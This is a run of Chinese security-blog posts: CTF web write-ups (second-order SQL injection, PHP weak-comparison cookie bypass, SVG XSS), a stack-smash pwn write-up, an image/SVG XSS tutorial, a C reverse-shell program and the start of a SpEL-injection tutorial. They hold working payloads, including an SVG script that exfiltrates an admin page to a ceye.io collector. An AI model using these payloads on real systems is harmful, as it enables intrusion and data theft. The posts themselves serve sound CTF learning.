访问页面，没啥功能，查看页面源码也没有东西： 尝试访问robots.txt来看看是不是有某些提示，出现报错信息，看来是开启了Debug模式，从页面可看出是用了Symfony这个框架来搭建的： 随便点击一个php文件即可查看它的源代码。 那么我们就可以查看index.php了，前提是需要知道这个框架的index.php是在public目录中的： 可以看到，里面又包含了一个文件进来，访问该文件，发现里面调用了”secret_ctf_location/env”，再访问该文件在数据库配置的地址找到了flag： 0x03 SQL Injected题目地址，题目描述如下图，标题是SQL注入了，但提示说我不喜欢这名字，而且可以下载代码： 访问页面是个登录界面，可注册： 随便注册个用户，注册成功后自动登录进界面： 点击左上角的Flags界面显示”Error! You need to be an admin to access this area”即无权访问。 在index页面编辑title和内容然后Post，即可在下面更新显示内容： 在Find Posts一栏，输入指定用户名会显示该用户发布过的内容： 大致功能了解了，现在来源码审计。 项目目录如下： 简单理下，create_db.sql是执行创建数据库表和字段内容的SQL语句；db.php配置数据库连接信息；flags.php即显示Flags页面，其中关键是判断$_SESSION[‘role’]是否为1，是则从包含的secret.php中输出flag；secret.php中保存了flag；logout.php即登出。 关键的几个文件为login.php、register.php和index.php，因为这几个是程序的主要处理逻辑，涉及到的SQL操作都在这几个文件中。 先看看register.php关键部分的SQL操作，对用户输入的username和password参数调用了mysqli_real_escape_string()函数进行了转义过滤，然后写入INSERT语句，其中role字段值写死了为0，SQL语句执行成功后即跳转至index.php界面；也就是说，这里没法进行SQL注入了： 123456789101112131415161718192021222324if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) &#123; if(!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) &#123; $success = true; $username = mysqli_real_escape_string($conn, $_POST['username']); $password = mysqli_real_escape_string($conn, $_POST['password']); $sql = "INSERT INTO users (login, password, role) VALUES ('". $username ."', '". $password ."', 0)"; try &#123; $conn-&gt;query($sql); &#125; catch(Exception $err) &#123; echo 'err: '.$err; $success = false; &#125; &#125; else &#123; $success = false; &#125; if($success) &#123; $_SESSION['username'] = $username; $_SESSION['message'] = "&lt;div class=\"alert alert-success\"&gt; &lt;strong&gt;Success!&lt;/strong&gt; Welcome aboard ".$_SESSION['username']." ! &lt;/div&gt;"; header('location: index.php'); &#125;&#125; 同样看看login.php中进行SQL操作的代码，都是进行了mysqli_real_escape_string()函数的转义过滤，然后执行SELECT查询语句，这里也无法进行SQL注入；注意到，将查询成功后获取的用户名即login字段值赋给\$_SESSION[‘username’]，将role字段值赋值给​\$_SESSION[‘role’]： 123456789101112131415if (isset($_POST['username']) &amp;&amp; !empty($_POST['username']) &amp;&amp; isset($_POST['password']) &amp;&amp; !empty($_POST['password'])) &#123; $username = mysqli_real_escape_string($conn, $_POST['username']); $password = mysqli_real_escape_string($conn, $_POST['password']); $sql = "SELECT * FROM users WHERE login='". $username ."' and password='". $password ."'"; $res = $conn-&gt;query($sql); if($res-&gt;num_rows &gt; 0) &#123; $user = $res-&gt;fetch_assoc(); $_SESSION['username'] = $user['login']; $_SESSION['role'] = $user['role']; header('location: index.php'); die(); &#125; else &#123; $success = false; &#125;&#125; 最后看看index.php，可以看到界面输入的参数post、title、post_author等都进行了转义过滤，但是注意到在拼接的SQL语句中有的含有参数$_SESSION[‘username’]： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?php...if (isset($_POST[&apos;post&apos;]) &amp;&amp; isset($_POST[&apos;title&apos;])) &#123; if(!empty($_POST[&apos;post&apos;]) &amp;&amp; !empty($_POST[&apos;title&apos;])) &#123; $success = true; $post = mysqli_real_escape_string($conn, $_POST[&apos;post&apos;]); $title = mysqli_real_escape_string($conn, $_POST[&apos;title&apos;]); $sql = &quot;INSERT INTO posts (title, content, date, author) VALUES (&apos;&quot;. $title .&quot;&apos;, &apos;&quot;. $post .&quot;&apos;, CURDATE(), &apos;&quot;. $_SESSION[&apos;username&apos;] .&quot;&apos;)&quot;; try &#123; $conn-&gt;query($sql); &#125; catch(Exception $err) &#123; echo &apos;err: &apos;.$err; $success = false; &#125; &#125; else &#123; $success = false; &#125; if($success) &#123; $_SESSION[&apos;message&apos;] = &quot;&lt;div class=\&quot;alert alert-success\&quot;&gt; &lt;strong&gt;Success!&lt;/strong&gt; Your post has been saved! &lt;/div&gt;&quot;; &#125;&#125;if (isset($_POST[&apos;post_author&apos;])) &#123; $sql = &quot;SELECT * FROM posts WHERE author = &apos;&quot;. mysqli_real_escape_string($conn, $_POST[&apos;post_author&apos;]) .&quot;&apos;&quot;; try &#123; $posts = $conn-&gt;query($sql); &#125; catch(Exception $err) &#123; echo &apos;err: &apos;.$err; &#125;&#125; else &#123; $sql = &quot;SELECT * FROM posts WHERE author = &apos;&quot;. $_SESSION[&apos;username&apos;] .&quot;&apos;&quot;; try &#123; $posts = $conn-&gt;query($sql); &#125; catch(Exception $err) &#123; echo &apos;err: &apos;.$err; &#125;&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;...&lt;div class=&quot;content&quot;&gt;&lt;?phpif(isset($_SESSION[&apos;message&apos;]) &amp;&amp; $_SESSION[&apos;message&apos;]) &#123; echo $_SESSION[&apos;message&apos;]; $_SESSION[&apos;message&apos;] = null;&#125;?&gt;&lt;div&gt; &lt;form class=&quot;post-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;input class=&quot;form-control&quot; placeholder=&quot;Title&quot; name=&quot;title&quot; style=&quot;margin-bottom: 10px;&quot; /&gt; &lt;textarea class=&quot;form-control&quot; placeholder=&quot;Express yourself ...&quot; name=&quot;post&quot;&gt;&lt;/textarea&gt; &lt;input type=&quot;submit&quot; class=&quot;btn btn-primary post-btn&quot; value=&quot;Post&quot;&gt; &lt;/form&gt;&lt;/div&gt;&lt;h5 style=&quot;color: gray;&quot;&gt;Find Posts&lt;/h5&gt;&lt;form class=&quot;post-search&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;input class=&quot;form-control&quot; placeholder=&quot;username&quot; style=&quot;width: 250px;&quot; name=&quot;post_author&quot; value=&quot;&lt;?php echo $_POST[&apos;post_author&apos;] ?&gt;&quot;/&gt; &lt;button class=&quot;btn btn-outline-success&quot; type=&quot;submit&quot;&gt; Find &lt;/button&gt;&lt;/form&gt;&lt;?phpecho &quot;&lt;h5 class=\&quot;results-count\&quot;&gt;Results: $posts-&gt;num_rows&lt;/h5&gt;&quot;;if($posts-&gt;num_rows &gt; 0) &#123; while($post = $posts-&gt;fetch_assoc()) &#123;?&gt; &lt;div style=&quot;padding-bottom: 20px&quot;&gt; &lt;div&gt; &lt;h5 style=&quot;display: inline&quot;&gt; &lt;?php echo $post[&apos;title&apos;] ?&gt;&lt;/h5&gt; &lt;h6 class=&quot;float-right&quot;&gt; &lt;?php echo $post[&apos;date&apos;] ?&gt;&lt;/h6&gt; &lt;/div&gt; &lt;h6&gt; &lt;?php echo $post[&apos;content&apos;] ?&gt;&lt;/h6&gt; &lt;div class=&quot;float-right&quot;&gt; By: &lt;?php echo $post[&apos;author&apos;] ?&gt; &lt;/div&gt; &lt;/div&gt; &lt;hr/&gt;&lt;?php &#125;&#125;?&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 因为以上几个文件中外界输入的参数都进行了mysqli_real_escape_string()函数的转义过滤，因此无法从输入的参数进行直接的SQL注入。但是前面注意到index.php中有些SQL语句含有拼接$_SESSION[‘username’]的写法，先列下出现的语句吧： 123$sql = "INSERT INTO posts (title, content, date, author) VALUES ('". $title ."', '". $post ."', CURDATE(), '". $_SESSION['username'] ."')";$sql = "SELECT * FROM posts WHERE author = '". $_SESSION['username'] ."'"; 只有两句，一个为INSERT一个为SELECT语句。前面我们知道$_SESSION[‘username’]是从login.php中查询表的login字段即用户名得来的。 再回看题目，flag就在Flags界面，但只有role为1的用户才能访问，那就需要SQL注入dump下role为1的用户名/密码登录访问来获取flag了。 那么就清晰了，在注册时往username进行SQL注入，虽然注册时调用mysqli_real_escape_string()函数转移过滤了，但是在存储进数据库的时候是你输入时的内容而不包含转义符\，因此在$_SESSION[‘username’]从users表中提取login字段时就是注入时的原格式，在拼接SQL语句时会直接造成SQL注入。 确认一下，使用M7’作为用户名注册登录，可以看到注册成功后直接跳转过去的index.php界面显示的用户名中的单引号前是有转移符\的，这是因为此时的$_SESSION[‘username’]是由注册时调用mysqli_real_escape_string()函数后直接赋值过来的结果： 其实存储在数据库中的内容是没有转移符\的，我们登出再登录，会发现转移符不见了，这是因为此时的$_SESSION[‘username’]是从数据库中查询得来的： OK，那剩下的就是如何进行SQL注入了。 相比之下INSERT语句作用不大，但SELECT语句可以列出用户名和密码等字段值，因此利用SELECT语句进行SQL注入来dump role为1的用户信息。 构造payload前先看下create_db.sql中的posts表是存在5个字段，而users表是存在id、login、passwod和role等4个字段： 123create database webn;create table users (id int auto_increment primary key, login varchar(100), password varchar(100), role boolean default 0);create table posts (id int auto_increment primary key, title varchar(50), content text, date Date, author varchar(100)); 注册输入如下构造的用户名： 1'union select id,login,password,role,5 from users where role=1# 注册完新用户后登出再登录，可以看到输出了role为1、login即用户名为root的5个输出字段信息： 用root/jjLLgTGk3uif2rKBVwqH登录再访问Flags界面即可拿到flag：]]></content>
      <categories>
        <category>WriteUp:Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C编写实现Linux反弹shell]]></title>
    <url>%2F2019%2F03%2F24%2FC%E7%BC%96%E5%86%99%E5%AE%9E%E7%8E%B0Linux%E5%8F%8D%E5%BC%B9shell%2F</url>
    <content type="text"><![CDATA[网上实现Linux反弹shell的方法各种各样，这里写下用C编写反弹shell的程序。参考了linux下C语言版反向shell： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;signal.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;int tcp_port = 6666;char *ip = "192.168.17.129";void reverse_shell()&#123; int fd; if ( fork() &lt;= 0)&#123; struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(tcp_port); addr.sin_addr.s_addr = inet_addr(ip); fd = socket(AF_INET, SOCK_STREAM, 0); if ( connect(fd, (struct sockaddr*)&amp;addr, sizeof(addr)) )&#123; exit(0); &#125; dup2(fd, 0); dup2(fd, 1); dup2(fd, 2); execve("/bin/bash", 0LL, 0LL); &#125; return;&#125;void main(int argc, char const *argv[])&#123; reverse_shell(); return 0;&#125; 现在Kali中开启nc监听：nc -lvp 6666 在Ubuntu上gcc编译并运行： 在Kali连接到shell了：]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>安全开发</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[花式栈溢出之Stack smash]]></title>
    <url>%2F2019%2F03%2F23%2F%E8%8A%B1%E5%BC%8F%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8BStack-smash%2F</url>
    <content type="text"><![CDATA[Stack smash 在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 __stack_chk_fail 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下： 1234567891011void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail ("stack smashing detected");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "&lt;unknown&gt;");&#125; 所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 __fortify_fail 函数中就会输出我们想要的信息。 EKOPARTY PRE-CTF 2015: Smashing the stack for fun and profit这里结合ekoparty-pre-ctf-2015的一道Pwn题来学习，题目下载地址。 在本地运行前，需要在本地先建立一个flag.txt。 运行程序，先给个有趣的地址，然后给你输入用户名；file查看是静态链接文件；checksec发现开启了NX和Canary： IDA看下main()函数，程序会打开本地的flag.txt文件，然后复制该文件描述符到一个buf中，接着输出一个指向该buf的地址并询问你的用户名，通过read()函数获取0x400长度的用户输入的内容，而0x400数值过大，由此可知read()函数存在栈溢出漏洞： 这样看应该是直接给了获取flag的地址了。 回到之前安全编译选项检测的结果发现，程序是开了Canary的，根据Canary的原理，其在一个函数入口处从fs段内获取一个随机值，一般存到EBP - 0x4(32位)或RBP - 0x8(64位)的位置，如果攻击者利用栈溢出修改到了这个值，导致该值与存入的值不一致，__stack_chk_fail()函数将抛出异常并退出程序。 先试下发送大量字符，查看到抛出异常信息，即调用了Canary实现代码中的__libc_message()将__libc_argv[0]打印了出来，这里__libc_argv[0]为本程序名，同时发现程序只是终止了而非栈溢出时的段错误： 也就是说，只要溢出的内容覆盖了Canary插入的cookie，Canary就会报错，且当前输入200个字符还未达到覆盖到argv[0]的位置。整个栈结构及溢出原理如下图所示： 下面只需要确定溢出的变量地址距离argv[0]的偏移地址。 Method1——使用pattern 之前pattern_create生成的200个字符串并未使程序出现段错误，后面尝试到400个字符串时发生段错误，没有输出Canary出错返回的异常信息而是输出Segmentation fault，即输入字符溢出覆盖了argv[0]地址导致程序无法正常读取该值从而发生错误： pattern_offset得到偏移量为376： Method2——断点调试 先在main()函数打断点，运行： 可以看出0x7fffffffe2bd保存的是程序名，其自然就是 argv[0]，所以我们修改的内容就是这个地址。同时0x7fffffffdf48处保留着该地址，所以我们真正需要覆盖的地址是0x7fffffffdf48。 此时RBP的地址为0x7fffffffde60；在前面IDA中可以看到变量v8相对于RBP的偏移量为90h，因此可算出v8变量的地址为RBP-90h=0x7fffffffddd0。 最后可以算出v8变量到需要覆盖的地址的偏移量为：|0x7fffffffddd0 - 0x7fffffffdf48|=178h=376(d) 编写payload： 123456789from pwn import *sh = process("./xpl")addr = int(sh.recvline().split()[4], 16)payload = flat(["A" * 376, p64(addr)])sh.sendline(payload)result = sh.recvall()print result 运行getflag：]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>栈溢出</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片XSS小结]]></title>
    <url>%2F2019%2F03%2F22%2F%E5%9B%BE%E7%89%87XSS%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[最近做题遇到图片XSS的构造，这里就小结一下笔记吧。 图片XSS图片XSS，简单地说，就是将JavaScript代码尽量插入图片的无用区域，在不影响图片显示的情况下满足JS代码格式从而执行图片中的JS代码导致XSS。 注意：只对IE有效，Chrome和Firefox无法触发。 向gif文件中注入JavaScript的脚本：http://pastebin.com/6yUbfGX5 向bmp文件中注入JavaScript的脚本：http://pastebin.com/04y7ee3u gif图片插入payload：python gif_injector.py -i flower.gif &quot;alert(&#39;Mi1k7ea&#39;);&quot; bmp图片插入payload：python bmpinjector.py -i pain.bmp &quot;alert(location);&quot; 写段页面代码加载该图片： 123456789&lt;html&gt;&lt;head&gt;&lt;title&gt;Image XSS Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src="flower.gif_malw.gif" /&gt;&lt;script src="flower.gif_malw.gif"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 但是现在只剩gif可以执行XSS了，bmp不行： SVG XSSSVG是一种基于XML的图像文件格式。 use元素SVG中的use元素用于重用其他元素，主要用于联接defs和alike，而我们却用它来引用外部SVG文件中的元素。 元素通过其id被引用，在use标签的xlink:href属性中以’#’井字符开头，外部元素的引用同样如此。 示例如下。 pic.html： 123&lt;svg&gt;&lt;use xlink:href='exp.svg#m7' /&gt;&lt;/svg&gt; exp.svg： 12345&lt;svg id="m7" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"&gt; &lt;a xlink:href="javascript:alert('Mi1k7ea')"&gt; &lt;rect x="0" y="0" width="100" height="100" /&gt; &lt;/a&gt;&lt;/svg&gt; .svg文件以svg标签开始，其id设置为m7，使用rect标签绘一个矩形。可以使用a环绕rect标签，这样会创建一个超链接。使用Javascript伪协议，可点击的超链接在点击后会执行Javascript。虽然SVG是经由use标签加载的，但是Javascript将会执行。有一点需要注意，它只能加载SVG文件，必须满足同源策略。 可以看到测试结果，在chrome和Firefox下点击黑框都能弹框： data:url+Base64由于加载的外部SVG文件必须是同源的，这个特性看起来似乎无法作为有用的XSS攻击向量，但可以使用data:url协议来帮我们提升这个攻击向量。 首先，它允许我们从内部创建一个文件，要求正确的mime-type，在这里为image/svg+xml。mimie-type后是我们的攻击载荷或关键字base64。特别地，由于数据被base64编码，这有助于避免突破HTML结构的问题。 现在我们不必再依赖于服务器上的另一个文件了，改进一下pic.html： 123&lt;svg&gt;&lt;use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0ibTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4NCjxhIHhsaW5rOmhyZWY9ImphdmFzY3JpcHQ6YWxlcnQoJ1hTUyEnKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zdmc+#m7" /&gt;&lt;/svg&gt; 其中base64加密的内容为： 123&lt;svg id="m7" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"&gt;&lt;a xlink:href="javascript:alert('XSS!')"&gt;&lt;rect x="0" y="0" width="100" height="100" /&gt;&lt;/a&gt;&lt;/svg&gt; 但只能在Firefox中测试可行，点击黑框后能够成功触发： 无需点击——foreignObject元素如果在exp.svg中写script标签是不会被解析，但是SVG支持foreignObject元素。 通过阐述这个对象需要的扩展属性，有可能加载非SVG元素。这就意味着现在有可能是有iframe、embed及其他所有支持的HTML元素了，我们可以从一堆元素中进行选择执行Javascript，这里使用embed+JavascriptURL协议。 pic.html： 123&lt;svg&gt;&lt;use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0ibTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo8Zm9yZWlnbk9iamVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiByZXF1aXJlZEV4dGVuc2lvbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPgoJPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoNjY2KSIgLz4KPC9mb3JlaWduT2JqZWN0Pgo8L3N2Zz4=#m7" /&gt;&lt;/svg&gt; 其中base64加密内容为： 123456&lt;svg id="m7" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;foreignObject width="100" height="50" requiredExtensions="http://www.w3.org/1999/xhtml"&gt; &lt;embed xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(666)" /&gt;&lt;/foreignObject&gt;&lt;/svg&gt; 可以看到，在Firefox下，无需点击即可触发foreignObject标签内embed的JS伪协议执行JS代码从而弹框，同时没有弹框显示1说明了script标签不会被解析： link XSS前面利用use元素结合data:url只能在Firefox下生效，Chrome却不会触发。 这里可利用link来bypass Chrome。 示例pic.html如下，加密内容为&lt;script&gt;alert(&quot;Hello&quot;);&lt;/script&gt;： 1&lt;link rel="import" href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="&gt; 在Chrome下成功执行（Firefox未成功）： 当然link的形式很多，href的地方本身就是可以插入js代码的，但是通过base64加密，可以bypass各种奇怪的过滤。 这里很多用到了data类型的url，可参考如下： 123456789101112data:,&lt;文本数据&gt; data:text/plain,&lt;文本数据&gt; data:text/html,&lt;HTML代码&gt; data:text/html;base64,&lt;base64编码的HTML代码&gt; data:text/css,&lt;CSS代码&gt; data:text/css;base64,&lt;base64编码的CSS代码&gt; data:text/javascript,&lt;Javascript代码&gt; data:text/javascript;base64,&lt;base64编码的Javascript代码&gt; data:image/gif;base64,base64编码的gif图片数据 data:image/png;base64,base64编码的png图片数据 data:image/jpeg;base64,base64编码的jpeg图片数据 data:image/x-icon;base64,base64编码的icon图片数据 参考浅析图片XSS中的哪些技术问题 用SVG绕过浏览器XSS审计]]></content>
      <categories>
        <category>Web安全基础</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Teaser CONFidence CTF Web writeup]]></title>
    <url>%2F2019%2F03%2F21%2FTeaser-CONFidence-CTF-Web-writeup%2F</url>
    <content type="text"><![CDATA[这次Web题只做了前两道，最后一道GO的题目不会就没做了。 My admin panel题目地址：http://gameserver.zajebistyc.tf/ 题目描述：I think I’ve found something interesting, but I’m not really a PHP expert. Do you think it’s exploitable? 访问该页面，是个登录界面，可以下载客户端包： 下载该包下来，解压打开看，发现全是C/C++代码，和本题提示的PHP无关，因此点一个不在这。 尝试随便输入登录，发现无论输入啥都是返回Done界面： 这样的话也没办法进行SQL注入和盲注了，因为无论输入什么内容返回内容都一样。 那就尝试用工具扫下Web站点下隐藏的页面，果不其然： 一个个访问，login.php返回”Not authenticated.”，其他文件无显示，访问admin目录，存在一个login.php.bak备份文件： 下载下来，代码如下： 1234567891011121314151617181920212223242526272829&lt;?phpinclude '../func.php';include '../config.php';if (!$_COOKIE['otadmin']) &#123; exit("Not authenticated.\n");&#125;if (!preg_match('/^&#123;"hash": [0-9A-Z\"]+&#125;$/', $_COOKIE['otadmin'])) &#123; echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit();&#125;$session_data = json_decode($_COOKIE['otadmin'], true);if ($session_data === NULL) &#123; echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); &#125;if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) &#123; echo("I CAN EVEN GIVE YOU A HINT XD \n"); for ($i = 0; i &lt; strlen(MD5('xDdddddd')); i++) &#123; echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0); &#125; exit("\n");&#125;display_admin(); 分析一下，先判断cookie字段是否存在otadmin属性；然后正则判断otadmin是否满足指定json格式的内容；提取出hash键值和$cfg_pass变量的MD5值进行比较，当不相等时输出一段经过运算后的提示信息。 注意，if ($session_data[&#39;hash&#39;] != strtoupper(MD5($cfg_pass))) {这里用的比较符是!=，按照习惯会想到是PHP弱类型。 随便填otadmin的内容发过去/admin/login.php看看，注意cookie值的构造要满足前面正则的匹配： 这里返回了一串经过运算处理后的内容： 0006464640640064000646464640006400640640646400 分析一下，只有0/6/4这几个数字。将运算的那段代码扣下来本地运行一下： 1234567891011121314&lt;?php$cfg_pass="Hello666";echo MD5($cfg_pass);echo "&lt;br&gt;";for ($i = 0; $i &lt; strlen(MD5('xDdddddd')); $i++) &#123; // echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0); echo MD5($cfg_pass)[$i]; echo "&lt;br&gt;"; echo ord(MD5($cfg_pass)[$i]); echo "&lt;br&gt;"; echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0); echo "&lt;br&gt;-------------&lt;br&gt;";&#125;?&gt; 随便给$cfg_pass变量赋值，然后运行观察，MD5值没啥好说的，到for循环后，先输出MD5的每一位，然后对其调用ord()函数取该字符对于的ASCII码，最后再和0xC0进行&amp;与运算： 可以看到，最后&amp;与运算的结果不是0就是64，那就写个小脚本确认一下： 12for x in xrange(1,127): print(str(x)+":"+str(x&amp;0xC0)) 运行这段代码会发现，1-63与运算后为0，64以后与运算后为64。我们知道，数字0-9的ASCII码为48-57，即数字与运算后结果均为0，而字母A-Za-z的ASCII码都大于64，即字母与运算后结果均为64。 那么就很明确了，再看看页面返回的值： 0006464640640064000646464640006400640640646400 前面3位是0，后面接着是字母结合数字的混合体。 这时就可以祭出弱类型了，我们知道123==&quot;123aivmfsjoo90i1jj90i0i031&quot;是恒成立的，因此剩下的问题就变成了只需要暴破该MD5的前3为数字即可绕过得到flag，最终爆破出的payload为Cookie: otadmin={&quot;hash&quot;: 389}： Web 50题目地址：http://web50.zajebistyc.tf/login?next=%2F 题目描述：idk what this site does, but you can put some secret, shoe size and report it to the admin… 访问页面，是个登录界面： 随便输入用户名和密码，进入了另一个界面： 其中有两个链接，Profile为当前登录用户的信息设置界面，包括设置一些字段内容和上传头像功能： 另一个Report a bug为向管理员报告bug链接的地方，由此推测是一道通过XSS窃取管理员cookie获取flag的题目： 回到用户信息设置界面，尝试将URL栏的本用户alan改为admin，可以访问，但是没有显示用户Avatar头像和Secret字段，猜测flag可能藏在Secret字段中： 回到本用户设置界面随意设置，发现图片只能上传100*100格式的，且对文件的Content-Type、后缀名以及文件内容前面部分进行了校验，一开始想上传一句话木马的，发现没有文件包含结合便无法利用。 后面想了一下应该就是注入XSS然后将用户链接发过去让admin访问。 写段测试代码，注意要设置宽度和高度均为100： 1234567&lt;?xml version="1.0" standalone="no"?&gt;&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" width="100" height="100"&gt;&lt;polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/&gt;&lt;script type="text/javascript"&gt;alert("Mi1k7ea");&lt;/script&gt;&lt;/svg&gt; 本地访问没问题： 上传到Avatar： 确认一下，访问该Avatar所在地址，没有问题，成功弹框： 到report界面上报，说admin会查看，确认了就是通过XSS获取admin的敏感信息来获得flag： 后面就修改一下JS代码，让admin访问自己的profile界面，因为其本身拥有对Secret字段的访问权，然后再通过JS实现XMLHttpRequest以POST形式发送过来，这样就可以得到它的Secret字段内容了： 1234567891011121314151617&lt;?xml version="1.0" standalone="no"?&gt;&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" width="100" height="100"&gt;&lt;polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/&gt;&lt;script type="text/javascript"&gt;var xhr = new XMLHttpRequest();xhr.onreadystatechange = function() &#123; if (xhr.readyState === 4) &#123; var xhr2 = new XMLHttpRequest(); xhr2.open("POST", "http://XXXX.ceye.io/"); xhr2.send(xhr.responseText); &#125;&#125; xhr.open("GET", "http://web50.zajebistyc.tf/profile/admin");xhr.withCredentials = true;xhr.send();&lt;/script&gt;&lt;/svg&gt; 再次上传svg图像，将该Avatar地址上报给admin，然后到ceye中可收到flag：]]></content>
      <categories>
        <category>WriteUp:Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpEL注入之javacon]]></title>
    <url>%2F2019%2F03%2F17%2FSpEL%E6%B3%A8%E5%85%A5%E4%B9%8Bjavacon%2F</url>
    <content type="text"><![CDATA[SpEL注入漏洞何为SpEL表达式 Spring Expression Language（简称 SpEL）是一种功能强大的表达式语言、用于在运行时查询和操作对象图；语法上类似于 Unified EL，但提供了更多的特性，特别是方法调用和基本字符串模板函数。SpEL 的诞生是为了给 Spring 社区提供一种能够与 Spring 生态系统所有产品无缝对接，能提供一站式支持的表达式语言。 SpEL使用方式 SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。 12345ExpressionParser parser = new SpelExpressionParser();Expression expression = parser.parseExpression("('Hello' + ' Mi1k7ea').concat(#end)");EvaluationContext context = new StandardEvaluationContext();context.setVariable("end", "!");System.out.println(expression.getValue(context)); 具体步骤如下： 创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现； 解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象； 构造上下文：准备比如变量定义等等表达式需要的上下文数据； 求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值； SpEL主要接口 ExpressionParser 接口：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符； EvaluationContext 接口：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。 Expression 接口：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。 SpEL语法——类相关表达式类类型表达式 T(Type)使用”T(Type)”来表示 java.lang.Class 实例，”Type”必须是类全限定名，”java.lang”包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。 使用示例： 1234567891011121314ExpressionParser parser = new SpelExpressionParser();// java.lang 包类访问Class&lt;String&gt; result1 = parser.parseExpression("T(String)").getValue(Class.class);System.out.println(result1);//其他包类访问String expression2 = "T(java.lang.Runtime).getRuntime().exec('open /Applications/Calculator.app')";Class&lt;Object&gt; result2 = parser.parseExpression(expression2).getValue(Class.class);System.out.println(result2);//类静态字段访问int result3 = 